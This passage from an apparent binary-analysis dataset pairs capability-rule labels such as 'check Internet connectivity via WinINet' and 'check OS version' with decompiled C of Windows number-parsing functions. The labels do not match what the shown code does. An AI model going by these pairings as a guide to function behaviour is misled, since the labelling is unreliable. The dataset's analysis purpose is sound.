< 0x30) || (iStack152 + 0x30U <= uVar11)) goto code_r0x0001400597e0;\n            }\n            else if (9 < uVar11 - 0x30) {\n                if (5 < uVar11 - 0x61) goto code_r0x000140059984;\n                iVar12 = uVar23 - 0x57;\n                goto code_r0x000140059531;\n            }\n            iVar12 = uVar23 - 0x30;\ncode_r0x000140059531:\n            do {\n                piVar4 = piStack104;\n                if (uStack156 < iVar19) {\n                    uVar22 = 1;\n                }\n                else {\n                    uVar23 = iVar19 * uStack136;\n                    iVar19 = uVar23 + iVar12;\n                    iVar21 = iVar21 + 1;\n                    uVar22 = uVar22 | 0xffff - iVar12 < uVar23;\n                }\n                uVar18 = iVar19;\n                piVar14 = piStack104[3];\n                if (piStack104[2] < piVar14) {\n                    piVar15 = piStack104[2] + 1;\n                    piStack104[2] = piVar15;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    piVar15 = piVar4[2];\n                    piVar14 = piVar4[3];\n                }\n                uStack96 = 0xffff;\n                if (piVar15 < piVar14) {\n                    iVar10 = *piVar15;\n                }\n                else {\n                    iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                }\n                if (iVar10 == -1) {\n                    piStack104 = NULL;\n                }\n                bVar24 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar24)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar9 = *piStack120[2];\n                    }\n                    else {\n                        iVar9 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar9 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar24 = iVar9 == -1;\n                }\n                if ((iVar10 == -1) == bVar24) {\n                    uVar2 = 1;\n                    goto code_r0x0001400595cd;\n                }\n                if (piStack104 != NULL) {\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar11 = *piStack104[2];\n                    }\n                    else {\n                        uVar11 = (**(*piStack104 + 0x48))();\n                    }\n                    if (uVar11 != 0xffff) goto code_r0x00014005950c;\n                    piStack104 = NULL;\n                }\n                if (uVar20 < 0xb) goto code_r0x0001400597e0;\n                uVar23 = 0xffff;\n                uVar11 = 0xffff;\ncode_r0x000140059984:\n                uVar18 = iVar19;\n                if (5 < uVar11 - 0x41) goto code_r0x0001400597e0;\n                iVar12 = uVar23 - 0x37;\n            } while( true );\n        }\n        uVar18 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\n    else {\n        if (uVar7 == 0) {\n            uVar22 = 0;\n            iVar19 = 0;\ncode_r0x0001400599c0:\n            uVar18 = iVar19;\n            if ((*(iVar13 + 0x20) == 0) || (*(iVar13 + 0x4a) != uVar11)) {\n                puVar16 = iVar13 + 0x9c;\n                iVar17 = iStack152;\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x0001400597e0;\n                while (uVar11 != *puVar16) {\n                    iVar17 = iVar17 + -1;\n                    puVar16 = puVar16 + 1;\n                    if (iVar17 == 0) goto code_r0x0001400597e0;\n                }\n                iVar12 = puVar16 - (iVar13 + 0x9c) >> 1;\n                if (0xf < iVar12) {\n                    iVar12 = iVar12 + -6;\n                }\n                uVar6 = uVar2;\n                if (uVar18 <= uStack156) {\n                    iVar19 = uVar18 * uStack136 + iVar12;\n                    iVar21 = iVar21 + 1;\n                    uVar6 = uVar22 | 0xffff - iVar12 < uVar18 * uStack136;\n                }\n            }\n            else {\n                if (iVar21 == 0) {\n                    uVar5 = *(iVar13 + 0x20);\n                    uVar2 = 0;\n                    goto code_r0x0001400595cd;\n                }\n                fcn.14007da40(aiStack80, iVar21);\n                iVar21 = 0;\n                uVar6 = uVar22;\n            }\n            uVar22 = uVar6;\n            piVar4 = piStack104;\n            uVar18 = iVar19;\n            piVar14 = piStack104[3];\n            if (piStack104[2] < piVar14) {\n                piVar15 = piStack104[2] + 1;\n                piStack104[2] = piVar15;\n            }\n            else {\n                (**(*piStack104 + 0x50))(piStack104);\n                piVar15 = piVar4[2];\n                piVar14 = piVar4[3];\n            }\n            uStack96 = 0xffff;\n            if (piVar15 < piVar14) {\n                iVar10 = *piVar15;\n            }\n            else {\n                iVar10 = (**(*piVar4 + 0x48))(piVar4);\n            }\n            if (iVar10 == -1) {\n                piStack104 = NULL;\n            }\n            bVar24 = uStack112 == -1;\n            if ((piStack120 != NULL) && (bVar24)) {\n                if (piStack120[2] < piStack120[3]) {\n                    iVar9 = *piStack120[2];\n                }\n                else {\n                    iVar9 = (**(*piStack120 + 0x48))();\n                }\n                if (iVar9 == -1) {\n                    piStack120 = NULL;\n                }\n                bVar24 = iVar9 == -1;\n            }\n            if ((iVar10 == -1) == bVar24) goto code_r0x0001400595cd;\n            if (piStack104 == NULL) {\n                uVar11 = 0xffff;\n            }\n            else {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            goto code_r0x0001400599c0;\n        }\n        uVar18 = 0;\n        uVar22 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\ncode_r0x0001400595cd:\n    uVar7 = uVar5;\n    if (*(aiStack80[0] + -0x18) != 0) goto code_r0x0001400597f5;\ncode_r0x0001400595e0:\n    if ((iVar21 != 0) || (bVar3)) {\ncode_r0x000140059839:\n        if (uVar7 == 0) {\n            if (uVar22 == 0) {\n                if (bVar25) {\n                    uVar18 = -uVar18;\n                }\n                *in_stack_00000038 = uVar18;\n            }\n            else {\n                *in_stack_00000038 = 0xffff;\n                *in_stack_00000030 = 4;\n            }\n            goto code_r0x000140059610;\n        }\n    }\n    goto code_r0x0001400595f3;\ncode_r0x0001400597e0:\n    uVar2 = 0;\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x0001400595e0;\ncode_r0x0001400597f5:\n    fcn.14007da40(aiStack80, iVar21);\n    cVar8 = fcn.1400b76a0(*(iVar13 + 0x10), *(iVar13 + 0x18), aiStack80);\n    if (cVar8 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\n    if (((iVar21 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x000140059839;\ncode_r0x0001400595f3:\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x000140059610:\n    if (uVar2 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar21 = **0x14010fc90;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, CONCAT22(uStack94, uStack96));\n    if (iVar21 == 0) {\n        iVar21 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar21 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar21 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar21 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4556
    },
    "140059da": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.140059da0(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    char cVar8;\n    int16_t iVar9;\n    int16_t iVar10;\n    uint16_t uVar11;\n    int32_t iVar12;\n    int64_t iVar13;\n    int16_t *piVar14;\n    uint64_t uVar15;\n    int16_t *piVar16;\n    uint16_t *puVar17;\n    uint64_t uVar18;\n    int64_t iVar19;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint64_t uVar20;\n    uint64_t uVar21;\n    uint32_t uVar22;\n    int32_t iVar23;\n    uint8_t uVar24;\n    uint32_t uVar25;\n    bool bVar26;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint64_t *in_stack_00000038;\n    int64_t iStack168;\n    bool bStack137;\n    int64_t *piStack120;\n    uint uStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint16_t uStack96;\n    ushort uStack94;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    uStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    uStack96 = *(in_R8 + 1);\n    uStack94 = *(in_R8 + 1) >> 0x10;\n    iVar13 = fcn.140026f80(in_stack_00000028 + 0xd0);\n    uVar25 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar25 == 0x40) {\n        uVar22 = 8;\ncode_r0x000140059e08:\n        uVar7 = fcn.140029ee0(&piStack104, &piStack120);\n        if (uVar7 == 0) {\ncode_r0x000140059e27:\n            uVar11 = uStack96;\n            if ((uStack96 == 0xffff) && (piStack104 != NULL)) {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            cVar8 = *(iVar13 + 0x20);\n            if ((*(iVar13 + 0x94) == uVar11) || (bStack137 = false,  *(iVar13 + 0x96) == uVar11)) {\n                bStack137 = *(iVar13 + 0x94) == uVar11;\n                if (cVar8 != '\\0') {\n                    if ((*(iVar13 + 0x4a) != uVar11) && (*(iVar13 + 0x48) != uVar11)) goto code_r0x00014005a16a;\n                    goto code_r0x000140059e66;\n                }\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x000140059e66;\ncode_r0x00014005a16a:\n                fcn.14009c0a0(piStack104);\n                uStack96 = 0xffff;\n                uVar7 = fcn.140029ee0(&piStack104, &piStack120);\n                if (uVar7 == 0) {\n                    uVar11 = fcn.140029f90(&piStack104);\n                    cVar8 = *(iVar13 + 0x20);\n                    goto code_r0x000140059e66;\n                }\n                iVar23 = 0;\n                bVar3 = false;\n            }\n            else {\ncode_r0x000140059e66:\n                iVar23 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar8 == '\\0' || (*(iVar13 + 0x4a) != uVar11)) &&\n                       (*(iVar13 + 0x48) != uVar11))) {\n                    if (*(iVar13 + 0x9c) == uVar11) {\n                        bVar3 = bVar3 ^ 1U | uVar22 == 10;\n                        if (!bVar3) goto code_r0x000140059e99;\n                        bVar26 = uVar22 == 8;\n                        if (bVar26 || uVar25 == 0) {\n                            iVar23 = 0;\n                            uVar22 = 8;\n                            bVar3 = bVar26 || uVar25 == 0;\n                        }\n                        else {\n                            iVar23 = iVar23 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x000140059e99:\n                        if ((*(iVar13 + 0x98) != uVar11) && (*(iVar13 + 0x9a) != uVar11)) {\n                            uVar7 = 0;\n                            bVar3 = true;\n                            goto code_r0x000140059f42;\n                        }\n                        uVar7 = uVar22 == 0x10 || uVar25 == 0;\n                        if (uVar22 != 0x10 && uVar25 != 0) {\n                            bVar3 = true;\n                            goto code_r0x000140059f4c;\n                        }\n                        iVar23 = 0;\n                        uVar22 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        piVar14 = piStack104[2] + 1;\n                        piStack104[2] = piVar14;\n                        if (piVar14 < piStack104[3]) goto code_r0x000140059f02;\ncode_r0x00014005a400:\n                        uStack96 = 0xffff;\n                        iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        piVar14 = piVar4[2];\n                        if (piVar4[3] <= piVar14) goto code_r0x00014005a400;\ncode_r0x000140059f02:\n                        uStack96 = 0xffff;\n                        iVar10 = *piVar14;\n                    }\n                    if (iVar10 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bVar26 = uStack112 == -1;\n                    if ((piStack120 != NULL) && (bVar26)) {\n                        if (piStack120[2] < piStack120[3]) {\n                            iVar9 = *piStack120[2];\n                        }\n                        else {\n                            iVar9 = (**(*piStack120 + 0x48))();\n                        }\n                        if (iVar9 == -1) {\n                            piStack120 = NULL;\n                        }\n                        bVar26 = iVar9 == -1;\n                    }\n                    if ((iVar10 == -1) == bVar26) {\n                        uVar7 = 1;\n                        goto code_r0x000140059f42;\n                    }\n                    uVar11 = 0xffff;\n                    if (piStack104 != NULL) {\n                        if (piStack104[2] < piStack104[3]) {\n                            uVar11 = *piStack104[2];\n                        }\n                        else {\n                            uVar11 = (**(*piStack104 + 0x48))();\n                        }\n                        if (uVar11 == 0xffff) {\n                            piStack104 = NULL;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar8 = *(iVar13 + 0x20);\n                }\n                uVar7 = 0;\n            }\ncode_r0x000140059f42:\n            if (uVar22 == 0x10) goto code_r0x00014005a1d9;\n        }\n        else {\n            bStack137 = false;\n            uVar11 = 0;\n            iVar23 = 0;\n            bVar3 = false;\n        }\ncode_r0x000140059f4c:\n        iStack168 = uVar22;\n        uVar25 = uVar22;\n    }\n    else {\n        uVar22 = 10;\n        if (uVar25 != 8) goto code_r0x000140059e08;\n        uVar22 = 0x10;\n        uVar7 = fcn.140029ee0(&piStack104, &piStack120);\n        if (uVar7 == 0) goto code_r0x000140059e27;\n        bStack137 = false;\n        uVar11 = 0;\n        iVar23 = 0;\n        bVar3 = false;\ncode_r0x00014005a1d9:\n        iStack168 = 0x16;\n        uVar25 = 0x10;\n        uVar22 = 0x16;\n    }\n    aiStack80[0] = fcn.14007b890(0, 0);\n    if (*(iVar13 + 0x20) != '\\0') {\n        fcn.14007d790(aiStack80, 0x20);\n    }\n    uVar18 = uVar25;\n    uVar15 = bStack137 + 0x7fffffffffffffff;\n    uVar2 = *(iVar13 + 200);\n    uVar5 = uVar7;\n    if (uVar2 == 0) {\n        uVar24 = 0;\n        if (uVar7 == 0) {\n            uVar21 = 0;\ncode_r0x000140059fda:\n            uVar25 = uVar11;\n            if (uVar22 < 0xb) {\n                if ((uVar11 < 0x30) || (iStack168 + 0x30U <= uVar11)) goto code_r0x00014005a2b8;\n            }\n            else if (9 < uVar11 - 0x30) {\n                if (5 < uVar11 - 0x61) goto code_r0x00014005a484;\n                iVar12 = uVar25 - 0x57;\n                goto code_r0x000140059fff;\n            }\n            iVar12 = uVar25 - 0x30;\ncode_r0x000140059fff:\n            do {\n                piVar4 = piStack104;\n                if (uVar15 / uVar18 < uVar21) {\n                    uVar24 = 1;\n                }\n                else {\n                    uVar20 = uVar21 * uVar18;\n                    uVar21 = uVar20 + iVar12;\n                    iVar23 = iVar23 + 1;\n                    uVar24 = uVar24 | uVar15 - iVar12 < uVar20;\n                }\n                piVar14 = piStack104[3];\n                if (piStack104[2] < piVar14) {\n                    piVar16 = piStack104[2] + 1;\n                    piStack104[2] = piVar16;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    piVar16 = piVar4[2];\n                    piVar14 = piVar4[3];\n                }\n                uStack96 = 0xffff;\n                if (piVar16 < piVar14) {\n                    iVar10 = *piVar16;\n                }\n                else {\n                    iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                }\n                if (iVar10 == -1) {\n                    piStack104 = NULL;\n                }\n                bVar26 = uStack112 == -1;\n                if ((piStack120 != NULL) && (bVar26)) {\n                    if (piStack120[2] < piStack120[3]) {\n                        iVar9 = *piStack120[2];\n                    }\n                    else {\n                        iVar9 = (**(*piStack120 + 0x48))();\n                    }\n                    if (iVar9 == -1) {\n                        piStack120 = NULL;\n                    }\n                    bVar26 = iVar9 == -1;\n                }\n                if (bVar26 == (iVar10 == -1)) {\n                    uVar2 = 1;\n                    goto code_r0x00014005a09e;\n                }\n                if (piStack104 != NULL) {\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar11 = *piStack104[2];\n                    }\n                    else {\n                        uVar11 = (**(*piStack104 + 0x48))();\n                    }\n                    if (uVar11 != 0xffff) goto code_r0x000140059fda;\n                    piStack104 = NULL;\n                }\n                if (uVar22 < 0xb) goto code_r0x00014005a2b8;\n                uVar25 = 0xffff;\n                uVar11 = 0xffff;\ncode_r0x00014005a484:\n                if (5 < uVar11 - 0x41) goto code_r0x00014005a2b8;\n                iVar12 = uVar25 - 0x37;\n            } while( true );\n        }\n        uVar21 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\n    else {\n        if (uVar7 == 0) {\n            uVar24 = 0;\n            uVar21 = 0;\ncode_r0x00014005a4c3:\n            if ((*(iVar13 + 0x20) == 0) || (*(iVar13 + 0x4a) != uVar11)) {\n                puVar17 = iVar13 + 0x9c;\n                iVar19 = iStack168;\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x00014005a2b8;\n                while (*puVar17 != uVar11) {\n                    iVar19 = iVar19 + -1;\n                    puVar17 = puVar17 + 1;\n                    if (iVar19 == 0) goto code_r0x00014005a2b8;\n                }\n                iVar12 = puVar17 - (iVar13 + 0x9c) >> 1;\n                if (0xf < iVar12) {\n                    iVar12 = iVar12 + -6;\n                }\n                uVar6 = uVar2;\n                if (uVar21 <= uVar15 / uVar18) {\n                    uVar20 = uVar21 * uVar18;\n                    uVar21 = uVar20 + iVar12;\n                    iVar23 = iVar23 + 1;\n                    uVar6 = uVar24 | uVar15 - iVar12 < uVar20;\n                }\n            }\n            else {\n                if (iVar23 == 0) {\n                    uVar5 = *(iVar13 + 0x20);\n                    uVar2 = 0;\n                    goto code_r0x00014005a09e;\n                }\n                fcn.14007da40(aiStack80, iVar23);\n                iVar23 = 0;\n                uVar6 = uVar24;\n            }\n            uVar24 = uVar6;\n            piVar4 = piStack104;\n            piVar14 = piStack104[3];\n            if (piStack104[2] < piVar14) {\n                piVar16 = piStack104[2] + 1;\n                piStack104[2] = piVar16;\n            }\n            else {\n                (**(*piStack104 + 0x50))(piStack104);\n                piVar16 = piVar4[2];\n                piVar14 = piVar4[3];\n            }\n            uStack96 = 0xffff;\n            if (piVar16 < piVar14) {\n                iVar10 = *piVar16;\n            }\n            else {\n                iVar10 = (**(*piVar4 + 0x48))(piVar4);\n            }\n            if (iVar10 == -1) {\n                piStack104 = NULL;\n            }\n            bVar26 = uStack112 == -1;\n            if ((piStack120 != NULL) && (bVar26)) {\n                if (piStack120[2] < piStack120[3]) {\n                    iVar9 = *piStack120[2];\n                }\n                else {\n                    iVar9 = (**(*piStack120 + 0x48))();\n                }\n                if (iVar9 == -1) {\n                    piStack120 = NULL;\n                }\n                bVar26 = iVar9 == -1;\n            }\n            if (bVar26 == (iVar10 == -1)) goto code_r0x00014005a09e;\n            if (piStack104 == NULL) {\n                uVar11 = 0xffff;\n            }\n            else {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            goto code_r0x00014005a4c3;\n        }\n        uVar21 = 0;\n        uVar24 = 0;\n        uVar5 = 0;\n        uVar2 = uVar7;\n    }\ncode_r0x00014005a09e:\n    uVar7 = uVar5;\n    if (*(aiStack80[0] + -0x18) != 0) goto code_r0x00014005a2d0;\ncode_r0x00014005a0b8:\n    if ((iVar23 != 0) || (bVar3)) {\ncode_r0x00014005a31a:\n        if (uVar7 == 0) {\n            if (uVar24 == 0) {\n                uVar15 = -uVar21;\n                if (bStack137 == false) {\n                    uVar15 = uVar21;\n                }\n                *in_stack_00000038 = uVar15;\n            }\n            else {\n                uVar15 = 0x7fffffffffffffff;\n                if (bStack137 != false) {\n                    uVar15 = 0x8000000000000000;\n                }\n                *in_stack_00000038 = uVar15;\n                *in_stack_00000030 = 4;\n            }\n            goto code_r0x00014005a0e8;\n        }\n    }\n    goto code_r0x00014005a0cb;\ncode_r0x00014005a2b8:\n    uVar2 = 0;\n    if (*(aiStack80[0] + -0x18) == 0) goto code_r0x00014005a0b8;\ncode_r0x00014005a2d0:\n    fcn.14007da40(aiStack80, iVar23);\n    cVar8 = fcn.1400b76a0(*(iVar13 + 0x10), *(iVar13 + 0x18), aiStack80);\n    if (cVar8 == '\\0') {\n        *in_stack_00000030 = 4;\n    }\n    if (((iVar23 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x00014005a31a;\ncode_r0x00014005a0cb:\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x00014005a0e8:\n    if (uVar2 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    iVar23 = **0x14010fc90;\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, CONCAT22(uStack94, uStack96));\n    if (iVar23 == 0) {\n        iVar23 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar23 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar23 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar23 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4641
    },
    "14005a8a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.14005a8a0(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    char cVar8;\n    int16_t iVar9;\n    int16_t iVar10;\n    uint16_t uVar11;\n    int32_t iVar12;\n    int64_t iVar13;\n    int16_t *piVar14;\n    uint64_t uVar15;\n    uint64_t uVar16;\n    int16_t *piVar17;\n    uint16_t *puVar18;\n    uint64_t uVar19;\n    int64_t iVar20;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint64_t uVar21;\n    uint32_t uVar22;\n    int32_t iVar23;\n    uint8_t uVar24;\n    uint32_t uVar25;\n    bool bVar26;\n    bool bVar27;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint64_t *in_stack_00000038;\n    int64_t iStack160;\n    int64_t *piStack120;\n    uint uStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint16_t uStack96;\n    ushort uStack94;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    uStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    uStack96 = *(in_R8 + 1);\n    uStack94 = *(in_R8 + 1) >> 0x10;\n    iVar13 = fcn.140026f80(in_stack_00000028 + 0xd0);\n    uVar25 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar25 == 0x40) {\n        uVar22 = 8;\ncode_r0x00014005a908:\n        uVar7 = fcn.140029ee0(&piStack104, &piStack120);\n        if (uVar7 == 0) {\ncode_r0x00014005a927:\n            uVar11 = uStack96;\n            if ((uStack96 == 0xffff) && (piStack104 != NULL)) {\n                if (piStack104[2] < piStack104[3]) {\n                    uVar11 = *piStack104[2];\n                }\n                else {\n                    uVar11 = (**(*piStack104 + 0x48))();\n                }\n                if (uVar11 == 0xffff) {\n                    piStack104 = NULL;\n                }\n            }\n            cVar8 = *(iVar13 + 0x20);\n            if ((*(iVar13 + 0x94) == uVar11) || (bVar27 = false,  *(iVar13 + 0x96) == uVar11)) {\n                bVar27 = *(iVar13 + 0x94) == uVar11;\n                if (cVar8 != '\\0') {\n                    if ((*(iVar13 + 0x4a) != uVar11) && (*(iVar13 + 0x48) != uVar11)) goto code_r0x00014005ac42;\n                    goto code_r0x00014005a966;\n                }\n                if (*(iVar13 + 0x48) == uVar11) goto code_r0x00014005a966;\ncode_r0x00014005ac42:\n                fcn.14009c0a0(piStack104);\n                uStack96 = 0xffff;\n                uVar7 = fcn.140029ee0(&piStack104, &piStack120);\n                if (uVar7 == 0) {\n                    uVar11 = fcn.140029f90(&piStack104);\n                    cVar8 = *(iVar13 + 0x20);\n                    goto code_r0x00014005a966;\n                }\n                iVar23 = 0;\n                bVar3 = false;\n            }\n            else {\ncode_r0x00014005a966:\n                iVar23 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar8 == '\\0' || (*(iVar13 + 0x4a) != uVar11)) &&\n                       (*(iVar13 + 0x48) != uVar11))) {\n                    if (*(iVar13 + 0x9c) == uVar11) {\n                        bVar3 = bVar3 ^ 1U | uVar22 == 10;\n                        if (!bVar3) goto code_r0x00014005a999;\n                        bVar26 = uVar22 == 8;\n                        if (bVar26 || uVar25 == 0) {\n                            iVar23 = 0;\n                            uVar22 = 8;\n                            bVar3 = bVar26 || uVar25 == 0;\n                        }\n                        else {\n                            iVar23 = iVar23 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x00014005a999:\n                        if ((*(iVar13 + 0x98) != uVar11) && (*(iVar13 + 0x9a) != uVar11)) {\n                            uVar7 = 0;\n                            bVar3 = true;\n                            goto code_r0x00014005aa42;\n                        }\n                        uVar7 = uVar22 == 0x10 || uVar25 == 0;\n                        if (uVar22 != 0x10 && uVar25 != 0) {\n                            bVar3 = true;\n                            goto code_r0x00014005aa4c;\n                        }\n                        iVar23 = 0;\n                        uVar22 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        piVar14 = piStack104[2] + 1;\n                        piStack104[2] = piVar14;\n                        if (piVar14 < piStack104[3]) goto code_r0x00014005aa02;\ncode_r0x00014005aeb0:\n                        uStack96 = 0xffff;\n                        iVar10 = (**(*piVar4 + 0x48))(piVar4);\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        piVar14 = piVar4[2];\n                        if (piVar4[3] <= piVar14) goto code_r0x00014005aeb0;\ncode_r0x00014005aa02:\n                        uStack96 = 0xffff;\n                        iVar10 = *piVar14;\n                    }\n                    if (iVar10 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bVar26 = uStack112 == -1;\n                    if ((piStack120 != NULL) && (bVar26)) {\n                        if (piStack120[2] < piStack120[3]) {\n                            iVar9 = *piStack120[2];\n                        }\n                        else {\n                            iVar9 = (**(*piStack120 + 0x48))();\n                        }\n                        if (iVar9 == -1) {\n                            piStack120 = NULL;\n                        }\n                        bVar26 = iVar9 == -1;\n                    }\n                    if ((iVar10 == -1) == bVar26) {\n                        uVar7 = 1;\n                        goto code_r0x00014005aa42;\n                    }\n                    uVar11 = 0xffff;\n                    if (piStack104 != NULL) {\n                        if (piStack104[2] < piStack104[3]) {\n                            uVar11 = *piStack104[2];\n                        }\n                        else {\n                            uVar11 = (**(*piStack104 + 0x48))();\n                        }\n                        if (uVar11 == 0xffff) {\n                            piStack104 = NULL;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar8 = *(iVar13 + 0x20);\n                }\n                uVar7 = 0;\n            }\ncode_r0x00014005aa42:\n            if (uVar22 == 0x10) goto code_r0x00014005acb1;\n        }\n        else {\n            bVar27 = false;\n            uVar11 = 0;\n            iVar23 = 0;\n            bVar3 = false;\n        }\ncode_r0x00014005aa4c:\n        iStack160 = uVar22;\n        uVar25 = uVar22;\n    }\n    else {\n        uVar22 = 10;\n        if (uVar25 != 8) goto code_r0x00014005a908;\n        uVar22 = 0x10;\n        uVar7 = fcn.140029ee0(&piStack104, &piStack120);\n        if (uVar7 == 0) goto code_r0x00014005a927;\n        bVar27 = false;\n        uVar11 = 0;\n        iVar23 = 0;\n        bVar3 = false;\ncode_r0x00014005acb1:\n        iStack160 = 0x16;\n        uVar25 = 0x10;\n        uVar22 = 0x16;\n    }\n    aiStack80[0] = fcn.14007b890(0, 0);\n    if (*(iVar13 + 0x20) != '\\0') {\n        fcn.14007d790(aiStack80, 0x20);\n    }\n    uVar19 = uVar25;\n    uVar15 = SUB168((ZEXT816(0) << 0x40 | ZEXT816(0xffffffffffffffff)) / ZEXT816(uVar19), 0);\n    uVar2 = *(iVar13 + 200);\n    uVar5 = uVar7;\n    if (uVar2 == 0) {\n        uVar24 = 0;\n        if (uVar7 == 0) {\n            uVar16 = 0;\ncode_r0x00014005aac4:\n            uVar25 = uVar11;\n            if (uVar22 < 0xb) {\n                if ((uVar11 < 0x30) || (iStack160 + 0x30U <= uVar11)) goto code_r0x00014005ad90;\n            }\n            else if (9 < uVar11 - 0x30) {\n                if (5 < uVar11 - 0x61) goto code_r0x00014005af34;\n                iVar12 = uVar25 - 0x57;\n                goto code_r0x00014005aae9;\n            }\n            iVar12 = uVar25 - 0x30;\ncode_r0x00014005aae9:\n            do {\n                piVar4 = piStack104;\n                if (uVar15 < uVar16) {\n                    uVar24 = 1;\n                }\n                else {\n                    uVar21 = uVar16 * uVar19;\n                    uVar16 = iVar12 + uVar21;\n                    iVar23 = iVar23 + 1;\n                    uVar24 = uVar24 | CARRY8(iVar12, uVar21);\n                }\n                piVar14 = piStack104[3];\n                if (piStack104[2] < piVar14) {\n                    piVar17 = piStack104[2] + 1;\n                    piStack104[2] = piVar17;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    piVar17 = piVar4[2];\n                    piVar14 = piVar4[3];\n                }\n                uStack96 = 0xffff;\n                if (piVar17 < piVar14) {\n                    